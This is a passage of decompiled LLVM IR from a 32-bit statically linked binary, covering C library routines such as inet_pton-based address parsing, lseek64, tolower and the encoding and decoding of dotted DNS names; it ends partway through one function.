dec_label_pc_80573b9:                             ; preds = %dec_label_pc_8057387, %dec_label_pc_805739d
  br i1 %v1_80573be, label %dec_label_pc_80573db, label %dec_label_pc_80573c0

dec_label_pc_80573c0:                             ; preds = %dec_label_pc_80573b9
  %v0_80573c0 = load i32, i32* @esi, align 4
  %v3_80573c1 = load i8*, i8** %stack_var_-44, align 4
  %v4_80573c1 = ptrtoint i8* %v3_80573c1 to i32
  %v0_80573c5 = load i32, i32* @ebx, align 4
  %v1_80573c5 = inttoptr i32 %v0_80573c5 to i32*
  %v2_80573c5 = load i32, i32* %v1_80573c5, align 4
  %v4_80573c9 = inttoptr i32 %v2_80573c5 to i8*
  %v5_80573c9 = call i32 @inet_pton(i32 2, i8* %v4_80573c9, i32 %v4_80573c1, i32 %v0_80573c0)
  store i32 %v5_80573c9, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_80573c9, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8057259, label %dec_label_pc_8057403.outer.backedge

dec_label_pc_8057403.outer.backedge:              ; preds = %dec_label_pc_80573c0, %dec_label_pc_80573e2, %dec_label_pc_80573db
  %v0_8057403120 = load i32, i32* @edx, align 4
  %v3_805740d121 = call i32 @fgets(i32 %v4_8057409, i32 %stack_var_4.0, i32 %v0_8057403120)
  store i32 %v3_805740d121, i32* @eax, align 4
  %v1_8057415122 = icmp eq i32 %v3_805740d121, 0
  %v1_8057417123 = icmp eq i1 %v1_8057415122, false
  br i1 %v1_8057417123, label %dec_label_pc_8057304.lr.ph, label %dec_label_pc_805741d

dec_label_pc_80573db:                             ; preds = %dec_label_pc_80573b9
  br i1 %v1_80573e0, label %dec_label_pc_8057403.outer.backedge, label %dec_label_pc_80573e2

dec_label_pc_80573e2:                             ; preds = %dec_label_pc_80573db
  %v0_80573e2 = load i32, i32* @ecx, align 4
  %v0_80573e7 = load i32, i32* @ebx, align 4
  %v1_80573e7 = inttoptr i32 %v0_80573e7 to i32*
  %v2_80573e7 = load i32, i32* %v1_80573e7, align 4
  %v4_80573eb = inttoptr i32 %v2_80573e7 to i8*
  %v5_80573eb = call i32 @inet_pton(i32 10, i8* %v4_80573eb, i32 %stack_var_-36.0, i32 %v0_80573e2)
  store i32 %v5_80573eb, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_80573eb, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8057286, label %dec_label_pc_8057403.outer.backedge

dec_label_pc_805741d:                             ; preds = %dec_label_pc_8057403.outer.backedge, %dec_label_pc_80572ed, %dec_label_pc_8057403.backedge, %dec_label_pc_80572b2
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_80572b2 ], [ 1, %dec_label_pc_80572ed ], [ 2, %dec_label_pc_8057403.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_8057403.backedge ]
  br i1 %v12_80571ac, label %dec_label_pc_805743d, label %dec_label_pc_8057424

dec_label_pc_8057424:                             ; preds = %dec_label_pc_805741d
  %v1_805742b = inttoptr i32 %stack_var_4.0 to i16*
  %v2_805742b = call i32 @__GI_fclose(i16* %v1_805742b)
  store i32 %v2_805742b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805743d

dec_label_pc_805743d:                             ; preds = %dec_label_pc_8057370, %dec_label_pc_805718d, %dec_label_pc_8057199, %dec_label_pc_80571b7, %dec_label_pc_80571ca, %dec_label_pc_80571d6, %dec_label_pc_80571df, %dec_label_pc_8057209, %dec_label_pc_805741d, %dec_label_pc_8057424, %dec_label_pc_805723f
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_805741d ], [ %stack_var_-28.1, %dec_label_pc_8057424 ], [ %v2_805724e, %dec_label_pc_805723f ], [ 34, %dec_label_pc_8057209 ], [ 34, %dec_label_pc_80571df ], [ 34, %dec_label_pc_80571d6 ], [ 34, %dec_label_pc_80571ca ], [ 34, %dec_label_pc_80571b7 ], [ 34, %dec_label_pc_8057199 ], [ 34, %dec_label_pc_805718d ], [ %stack_var_-28.0.ph131, %dec_label_pc_8057370 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8057178, i32* @ebx, align 4
  store i32 %v0_8057177, i32* @esi, align 4
  store i32 %v0_8057176, i32* @edi, align 4
  store i32 %v0_8057175, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_80573b2, { 0, 2, 1 }
  uselistorder i8 %v2_805732795, { 1, 2, 0 }
  uselistorder i8* %v1_805732794, { 1, 0 }
  uselistorder i32 %v0_805732747, { 1, 0 }
  uselistorder i32 %v2_805734d, { 1, 0 }
  uselistorder i32 %v1_8057346, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8057350.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_805733b, { 1, 0 }
  uselistorder i32 %v0_805733b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805732d, { 1, 0 }
  uselistorder i8* %v2_80573a6, { 1, 0 }
  uselistorder i32 %v4_8057409, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_80571ca, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80571a5, { 1, 0 }
  uselistorder i32 %v1_8057188, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 0, 1, 2, 4, 3 }
  uselistorder i32 5, { 17, 26, 27, 28, 0, 16, 10, 11, 20, 12, 29, 30, 2, 4, 25, 5, 6, 21, 7, 22, 13, 8, 23, 9, 24, 14, 15, 18, 19, 3, 1 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 17, 18, 19, 20, 21, 14, 0, 1, 13, 2, 22, 15, 16, 23, 24, 7, 11, 3, 4, 8, 12, 5, 6, 9, 10 }
  uselistorder i32* @global_var_805b278, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 104, 0, 105, 21, 22, 106, 107, 3, 81, 80, 2, 108, 109, 6, 110, 4, 111, 5, 112, 128, 8, 83, 82, 7, 60, 61, 113, 62, 63, 64, 65, 66, 67, 137, 68, 41, 42, 43, 102, 138, 130, 131, 139, 120, 119, 9, 125, 126, 79, 114, 69, 70, 71, 72, 73, 10, 74, 75, 11, 76, 77, 78, 115, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 18, 19, 20, 103, 17, 116, 117, 118, 121, 123, 122, 124, 127, 12, 129, 136, 133, 14, 134, 15, 135, 13, 132, 16 }
  uselistorder i32 35, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 5, 0, 4, 2, 3 }
  uselistorder i32 10, { 20, 2, 33, 34, 35, 36, 37, 38, 3, 27, 28, 30, 29, 4, 8, 39, 9, 32, 11, 10, 21, 5, 13, 26, 31, 12, 41, 22, 0, 23, 25, 24, 19, 18, 17, 14, 15, 1, 40, 6, 42, 43, 16, 7 }
  uselistorder i32 12, { 103, 104, 105, 0, 106, 20, 29, 107, 123, 24, 23, 6, 111, 7, 8, 9, 10, 11, 12, 13, 108, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 156, 28, 30, 102, 122, 31, 32, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 33, 34, 35, 36, 37, 38, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 25, 155, 112, 113, 114, 115, 157, 90, 1, 2, 91, 92, 14, 15, 93, 3, 109, 110, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 4, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 26, 76, 77, 78, 94, 95, 96, 21, 97, 98, 99, 100, 27, 22, 101, 19, 18, 17, 16, 116, 117, 118, 119, 120, 121, 5 }
  uselistorder i32 80, { 0, 5, 6, 7, 8, 9, 10, 11, 2, 3, 4, 1 }
  uselistorder i32 56, { 6, 5, 11, 12, 13, 14, 15, 2, 8, 3, 9, 4, 1, 16, 10, 7, 0 }
  uselistorder i32 44, { 10, 11, 12, 7, 8, 9, 23, 14, 15, 6, 20, 22, 21, 17, 18, 19, 16, 13, 2, 3, 1, 4, 5, 0 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 19, 20, 2, 21, 3, 4, 22, 14, 6, 7, 8, 9, 10, 5, 0, 1 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 19, 14, 4, 10, 5, 20, 21, 0, 11, 7, 6, 2, 13, 8, 9, 15, 16, 17, 18, 3, 1, 12 }
  uselistorder i32 -48, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 16, { 110, 109, 9, 111, 112, 29, 3, 113, 30, 114, 72, 73, 122, 123, 124, 125, 126, 127, 134, 128, 129, 130, 131, 132, 133, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 115, 116, 117, 118, 74, 75, 76, 77, 78, 79, 80, 81, 160, 31, 32, 45, 33, 66, 41, 48, 106, 49, 164, 10, 50, 51, 52, 0, 11, 153, 13, 12, 154, 1, 14, 145, 146, 37, 165, 119, 120, 82, 83, 84, 85, 86, 87, 2, 88, 89, 90, 91, 92, 15, 93, 94, 42, 95, 161, 162, 163, 121, 4, 53, 54, 55, 56, 57, 58, 60, 59, 61, 62, 63, 64, 65, 44, 34, 67, 68, 69, 70, 71, 38, 96, 97, 43, 98, 99, 6, 7, 100, 101, 102, 103, 104, 35, 36, 105, 26, 27, 28, 24, 25, 22, 23, 17, 18, 19, 20, 21, 46, 47, 107, 108, 8, 39, 147, 148, 149, 150, 151, 16, 40, 152, 5, 155, 156, 157, 158, 159 }
  uselistorder i32 8, { 147, 146, 148, 14, 15, 149, 150, 151, 152, 153, 154, 1, 155, 16, 10, 156, 157, 158, 48, 110, 51, 24, 25, 26, 27, 52, 28, 29, 30, 53, 31, 54, 32, 55, 56, 160, 111, 112, 113, 114, 115, 116, 49, 117, 118, 119, 221, 222, 45, 228, 46, 229, 47, 68, 33, 70, 145, 173, 71, 72, 175, 176, 177, 178, 179, 180, 181, 2, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 3, 73, 74, 75, 76, 77, 78, 79, 80, 192, 193, 194, 195, 196, 58, 4, 59, 5, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 57, 214, 215, 6, 216, 217, 218, 219, 7, 220, 167, 168, 17, 227, 161, 162, 18, 19, 69, 120, 121, 122, 123, 125, 126, 127, 124, 128, 129, 130, 131, 34, 35, 132, 133, 134, 135, 136, 137, 20, 223, 224, 225, 163, 164, 165, 166, 159, 226, 81, 82, 83, 84, 23, 60, 61, 62, 85, 86, 0, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 21, 103, 104, 105, 50, 106, 107, 63, 108, 64, 109, 138, 139, 140, 141, 11, 142, 12, 65, 67, 36, 66, 143, 144, 44, 43, 42, 40, 41, 37, 38, 39, 13, 169, 170, 171, 172, 22, 174, 9, 8 }
  uselistorder i32 -32, { 15, 0, 1, 2, 13, 14, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder i32 32, { 77, 27, 78, 79, 26, 32, 84, 47, 85, 86, 87, 45, 46, 62, 24, 95, 33, 54, 74, 75, 58, 25, 56, 57, 1, 0, 2, 3, 48, 4, 55, 5, 6, 7, 8, 9, 10, 28, 82, 80, 81, 63, 64, 29, 65, 66, 67, 68, 69, 70, 71, 11, 72, 73, 49, 93, 94, 83, 92, 59, 60, 61, 76, 36, 12, 50, 51, 13, 52, 30, 15, 14, 38, 37, 34, 31, 39, 16, 17, 19, 18, 40, 21, 20, 41, 43, 23, 22, 42, 88, 89, 90, 91, 44, 35, 53 }
  uselistorder i32 4, {}
  uselistorder i32* @ebp, { 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 10, 11, 12, 1, 13, 14, 15, 4, 75, 76, 77, 82, 78, 79, 80, 81, 83, 29, 30, 84, 88, 99, 100, 129, 130, 131, 31, 32, 33, 34, 35, 16, 17, 18, 58, 59, 160, 161, 162, 163, 164, 19, 20, 165, 166, 167, 168, 169, 170, 171, 172, 177, 173, 174, 175, 176, 3, 178, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 5, 36, 37, 38, 39, 40, 94, 2, 95, 96, 97, 98, 89, 90, 91, 92, 93, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 7, 8, 9, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 114, 113, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 53, 54, 55, 85, 86, 87, 21, 22, 23, 24, 25, 26, 27, 28, 56, 57, 6, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 179, 180, 181, 182 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805743d, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805741d, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8057403.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80573b9, { 1, 0 }
  uselistorder label %dec_label_pc_805739d, { 1, 0 }
  uselistorder label %dec_label_pc_8057360, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8057327.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805734d, { 1, 0 }
  uselistorder label %dec_label_pc_805731b, { 1, 0 }
  uselistorder label %dec_label_pc_8057304, { 1, 0 }
  uselistorder label %dec_label_pc_8057304.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_80572ed, { 1, 0 }
  uselistorder label %dec_label_pc_80572b2, { 1, 0 }
  uselistorder label %dec_label_pc_8057209, { 1, 0 }
  uselistorder label %dec_label_pc_8057199, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805744e = load i32, i32* @ebx, align 4
  store i32 %v0_805744e, i32* %stack_var_-12, align 4
  %v2_8057462 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057462, i32* %esi.global-to-local, align 4
  %v1_8057479 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8057479, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8057479, -4095
  br i1 %tmp18, label %dec_label_pc_8057493, label %dec_label_pc_8057485

dec_label_pc_8057485:                             ; preds = %entry
  %v2_8057466 = ashr i32 %arg3, 31
  %v1_8057485 = call i32 @__errno_location(i32 %v2_8057466)
  %v0_805748a = load i32, i32* %esi.global-to-local, align 4
  %v1_805748a = sub i32 0, %v0_805748a
  %v2_805748c = inttoptr i32 %v1_8057485 to i32*
  store i32 %v1_805748a, i32* %v2_805748c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80574a7.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8057497

dec_label_pc_8057493:                             ; preds = %entry
  %v1_8057493 = icmp eq i32 %v1_8057479, 0
  br i1 %v1_8057493, label %dec_label_pc_805749c, label %dec_label_pc_8057497

dec_label_pc_8057497:                             ; preds = %dec_label_pc_8057493, %dec_label_pc_8057485
  %v2_80574a7.pre = phi i32 [ %v0_805744e, %dec_label_pc_8057493 ], [ %v2_80574a7.pre.pre, %dec_label_pc_8057485 ]
  %v0_8057497 = phi i32 [ %v1_8057479, %dec_label_pc_8057493 ], [ -1, %dec_label_pc_8057485 ]
  %v1_8057499 = ashr i32 %v0_8057497, 31
  br label %dec_label_pc_80574a4

dec_label_pc_805749c:                             ; preds = %dec_label_pc_8057493
  %v3_805749c = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80574a4

dec_label_pc_80574a4:                             ; preds = %dec_label_pc_8057497, %dec_label_pc_805749c
  %v2_80574a7 = phi i32 [ %v2_80574a7.pre, %dec_label_pc_8057497 ], [ %v0_805744e, %dec_label_pc_805749c ]
  %v0_80574aa = phi i32 [ %v0_8057497, %dec_label_pc_8057497 ], [ %v3_805749c, %dec_label_pc_805749c ]
  %storemerge = phi i32 [ %v1_8057499, %dec_label_pc_8057497 ], [ %tmp, %dec_label_pc_805749c ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_80574a7, i32* @ebx, align 4
  ret i32 %v0_80574aa

; uselistorder directives
  uselistorder i32 %v1_8057479, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805744e, { 1, 0, 2 }
  uselistorder i32 (i32)* @__errno_location, { 55, 43, 71, 70, 69, 42, 41, 54, 53, 40, 25, 37, 52, 51, 30, 45, 24, 64, 13, 12, 11, 10, 9, 68, 8, 23, 22, 7, 21, 47, 46, 57, 56, 67, 66, 65, 63, 20, 19, 35, 18, 36, 50, 49, 48, 2, 39, 38, 14, 44, 6, 5, 62, 32, 31, 61, 29, 4, 16, 3, 28, 15, 60, 59, 34, 27, 26, 58, 1, 0, 72, 33, 17 }
  uselistorder i32 31, { 21, 22, 16, 23, 24, 31, 32, 25, 26, 12, 2, 3, 0, 1, 11, 30, 17, 18, 19, 6, 7, 4, 5, 13, 8, 9, 27, 28, 20, 14, 15, 29, 10, 33, 34, 35, 36, 37 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80574a4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80574b0 = add i32 %arg1, 128
  %v6_80574bb = icmp ugt i32 %v1_80574b0, 383
  br i1 %v6_80574bb, label %dec_label_pc_80574c6, label %dec_label_pc_80574bd

dec_label_pc_80574bd:                             ; preds = %entry
  %v0_80574bd = load i32, i32* bitcast (i32** @global_var_805b4e0.492 to i32*), align 32
  %v2_80574c2 = mul i32 %arg1, 2
  %v3_80574c2 = add i32 %v0_80574bd, %v2_80574c2
  %v4_80574c2 = inttoptr i32 %v3_80574c2 to i16*
  %v5_80574c2 = load i16, i16* %v4_80574c2, align 2
  %v6_80574c2 = sext i16 %v5_80574c2 to i32
  store i32 %v6_80574c2, i32* @edx, align 4
  br label %dec_label_pc_80574c6

dec_label_pc_80574c6:                             ; preds = %entry, %dec_label_pc_80574bd
  %v0_80574c6 = phi i32 [ %arg1, %entry ], [ %v6_80574c2, %dec_label_pc_80574bd ]
  ret i32 %v0_80574c6

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 81, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 82, 85, 20, 21, 84, 22, 27, 23, 28, 24, 29, 25, 30, 26, 34, 31, 35, 32, 36, 33, 37, 38, 40, 39, 42, 41, 43, 47, 44, 48, 45, 49, 46, 50, 52, 51, 55, 53, 56, 54, 57, 58, 61, 59, 62, 60, 63, 64, 66, 65, 67, 68, 71, 72, 73, 69, 74, 70, 76, 75, 77, 79, 78, 80, 83 }
  uselistorder i32 128, { 19, 12, 14, 2, 3, 7, 13, 8, 9, 15, 4, 10, 11, 16, 0, 17, 18, 5, 1, 20, 6 }
  uselistorder label %dec_label_pc_80574c6, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80574cd = load i32, i32* @edi, align 4
  %v0_80574ce = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80574d5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80574d5, i32* @edi, align 4
  %v1_80575344 = icmp eq i8* %arg1, null
  br i1 %v1_80575344, label %dec_label_pc_805753d, label %dec_label_pc_8057538.lr.ph

dec_label_pc_8057538.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8057538

dec_label_pc_80574db:                             ; preds = %dec_label_pc_8057538
  %v5_80574e0 = call i32 @__GI_strchr(i8* %v1_8057538, i32 46)
  %v1_80574ea = icmp eq i32 %v5_80574e0, 0
  br i1 %v1_80574ea, label %dec_label_pc_80574f4, label %dec_label_pc_80574ee

dec_label_pc_80574ee:                             ; preds = %dec_label_pc_80574db
  %v1_80574f0 = load i32, i32* @edi, align 4
  %v2_80574f0 = sub i32 %v5_80574e0, %v1_80574f0
  br label %dec_label_pc_8057502

dec_label_pc_80574f4:                             ; preds = %dec_label_pc_80574db
  %v0_80574f7 = load i32, i32* @edi, align 4
  %v5_80574f7 = inttoptr i32 %v0_80574f7 to i8*
  %v3_80574f8 = call i32 @strlen(i8* %v5_80574f7)
  br label %dec_label_pc_8057502

dec_label_pc_8057502:                             ; preds = %dec_label_pc_80574ee, %dec_label_pc_80574f4
  %v0_8057515 = phi i32 [ %v2_80574f0, %dec_label_pc_80574ee ], [ %v3_80574f8, %dec_label_pc_80574f4 ]
  store i32 %v0_8057515, i32* @esi, align 4
  %v1_8057502 = icmp eq i32 %v0_8057515, 0
  %v3_8057502 = trunc i32 %v0_8057515 to i8
  br i1 %v1_8057502, label %dec_label_pc_8057551, label %dec_label_pc_8057506

dec_label_pc_8057506:                             ; preds = %dec_label_pc_8057502
  %v1_805750a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805750a = sub i32 %arg3, %v1_805750a
  %v1_805750c = add i32 %v2_805750a, -1
  %v7_805750d = icmp ult i32 %v0_8057515, %v1_805750c
  %v1_805750f = icmp eq i1 %v7_805750d, false
  br i1 %v1_805750f, label %dec_label_pc_8057551, label %dec_label_pc_8057511

dec_label_pc_8057511:                             ; preds = %dec_label_pc_8057506
  store i32 %arg2, i32* @edx, align 4
  %v4_8057517 = add i32 %v1_805750a, %arg2
  %v5_8057517 = inttoptr i32 %v4_8057517 to i8*
  store i8 %v3_8057502, i8* %v5_8057517, align 1
  %v0_805751a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805751a = add i32 %v0_805751a, 1
  %v0_805751c = load i32, i32* @edx, align 4
  %v2_805751e = add i32 %v1_805751a, %v0_805751c
  %v0_8057520 = load i32, i32* @esi, align 4
  %v0_8057521 = load i32, i32* @edi, align 4
  %v2_8057523 = add i32 %v0_8057520, %v1_805751a
  store i32 %v2_8057523, i32* %ebx.global-to-local, align 4
  %tmp29 = inttoptr i32 %v2_805751e to i16*
  %v7_8057525 = call i32 @memcpy(i16* %tmp29, i32 %v0_8057521, i32 %v0_8057520)
  %v1_8057531 = add i32 %v5_80574e0, 1
  br i1 %v1_80574ea, label %dec_label_pc_805753d, label %dec_label_pc_8057534

dec_label_pc_8057534:                             ; preds = %dec_label_pc_8057511
  store i32 %v1_8057531, i32* @edi, align 4
  %v1_8057534 = icmp eq i32 %v1_8057531, 0
  br i1 %v1_8057534, label %dec_label_pc_805753d, label %dec_label_pc_8057538

dec_label_pc_8057538:                             ; preds = %dec_label_pc_8057538.lr.ph, %dec_label_pc_8057534
  %v0_80574df = phi i32 [ %v4_80574d5, %dec_label_pc_8057538.lr.ph ], [ %v1_8057531, %dec_label_pc_8057534 ]
  %v1_8057538 = inttoptr i32 %v0_80574df to i8*
  %v2_8057538 = load i8, i8* %v1_8057538, align 1
  %v3_8057538 = icmp eq i8 %v2_8057538, 0
  %v1_805753b = icmp eq i1 %v3_8057538, false
  br i1 %v1_805753b, label %dec_label_pc_80574db, label %dec_label_pc_805753d

dec_label_pc_805753d:                             ; preds = %dec_label_pc_8057534, %dec_label_pc_8057538, %dec_label_pc_8057511, %entry
  %tmp30 = icmp slt i32 %arg3, 1
  br i1 %tmp30, label %dec_label_pc_8057551, label %dec_label_pc_8057544

dec_label_pc_8057544:                             ; preds = %dec_label_pc_805753d
  %v1_8057548 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057548 = add i32 %v1_8057548, %arg2
  %v3_8057548 = inttoptr i32 %v2_8057548 to i8*
  store i8 0, i8* %v3_8057548, align 1
  %v0_805754c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805754c = add i32 %v0_805754c, 1
  br label %dec_label_pc_8057554

dec_label_pc_8057551:                             ; preds = %dec_label_pc_8057506, %dec_label_pc_8057502, %dec_label_pc_805753d
  br label %dec_label_pc_8057554

dec_label_pc_8057554:                             ; preds = %dec_label_pc_8057544, %dec_label_pc_8057551
  %storemerge2 = phi i32 [ %v1_805754c, %dec_label_pc_8057544 ], [ -1, %dec_label_pc_8057551 ]
  store i32 %v0_80574ce, i32* @esi, align 4
  store i32 %v0_80574cd, i32* @edi, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v1_8057538, { 1, 0 }
  uselistorder i32 %v1_8057531, { 0, 2, 1 }
  uselistorder i32 %v0_8057520, { 1, 0 }
  uselistorder i1 %v1_80574ea, { 1, 0 }
  uselistorder i32 %v5_80574e0, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7, 11, 12 }
  uselistorder i32 46, { 2, 5, 0, 6, 1, 3, 4 }
  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 4 }
  uselistorder label %dec_label_pc_8057554, { 1, 0 }
  uselistorder label %dec_label_pc_8057551, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805753d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057538, { 1, 0 }
  uselistorder label %dec_label_pc_8057502, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_805755e = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_8057567 = icmp eq i32 %arg1, 0
  br i1 %v4_8057567, label %dec_label_pc_8057628, label %dec_label_pc_8057572

dec_label_pc_8057572:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80576102740 = add i32 %arg2, %arg1
  %v3_80576102841 = inttoptr i32 %v2_80576102740 to i8*
  %v4_80576102942 = load i8, i8* %v3_80576102841, align 1
  %v1_80576143144 = icmp eq i8 %v4_80576102942, 0
  %v1_80576163245 = icmp eq i1 %v1_80576143144, false
  br i1 %v1_80576163245, label %dec_label_pc_8057580.lr.ph, label %dec_label_pc_805761c

dec_label_pc_8057580:                             ; preds = %dec_label_pc_8057580.lr.ph, %dec_label_pc_8057599
  %v0_805758a = phi i32 [ %v0_805758a.pre, %dec_label_pc_8057580.lr.ph ], [ %v4_80575a4, %dec_label_pc_8057599 ]
  %v8_805758038 = phi i1 [ %v8_80575803350, %dec_label_pc_8057580.lr.ph ], [ true, %dec_label_pc_8057599 ]
  %v5_805761037.in = phi i8 [ %v5_80576103049.in, %dec_label_pc_8057580.lr.ph ], [ %v4_8057610, %dec_label_pc_8057599 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8057580.lr.ph ], [ 0, %dec_label_pc_8057599 ]
  %v0_805758735 = phi i32 [ %v0_8057587.ph46, %dec_label_pc_8057580.lr.ph ], [ %v2_80575b3, %dec_label_pc_8057599 ]
  %v5_805761037 = zext i8 %v5_805761037.in to i32
  %v1_8057587 = add i32 %v0_805758735, 1
  store i32 %v1_8057587, i32* @esi, align 4
  %v3_805758a = select i1 %v8_805758038, i32 2, i32 1
  %v4_805758a = add i32 %v3_805758a, %v0_805758a
  store i32 %v4_805758a, i32* %ebp.global-to-local, align 4
  %v1_805758d = and i32 %v5_805761037, 192
  %v6_8057592 = icmp eq i32 %v1_805758d, 192
  %v1_8057597 = icmp eq i1 %v6_8057592, false
  br i1 %v1_8057597, label %dec_label_pc_80575bc, label %dec_label_pc_8057599

